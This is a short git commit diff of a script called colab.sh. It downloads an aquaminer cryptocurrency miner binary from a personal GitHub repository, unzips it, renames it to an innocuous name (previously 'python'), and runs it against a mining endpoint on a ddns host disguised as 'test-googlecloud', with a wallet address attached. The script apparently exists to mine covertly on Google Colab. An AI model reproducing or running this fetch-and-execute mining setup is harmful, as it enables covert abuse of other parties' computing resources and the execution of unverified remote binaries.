7765e9230e8b47d94eeb98d48a7905f2894220cd
StupidmanTan <40017939+StupidmanTan@users.noreply.github.com>
2018-06-15 12:14:10 +0700

    Update colab.sh

--- colab.sh
+++ colab.sh
@@ -28,8 +28,8 @@ fi
 exit
 fi
 
-wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
+wget https://github.com/StupidmanTan/miner-cpu/raw/master/aquaminer-0.4-linux-amd64.zip
 unzip aquaminer-0.4-linux-amd64.zip
-mv aquaminer-0.4-linux-amd64 python
-./python -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
+mv aquaminer-0.4-linux-amd64 kaka
+./kaka -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
 exit 0
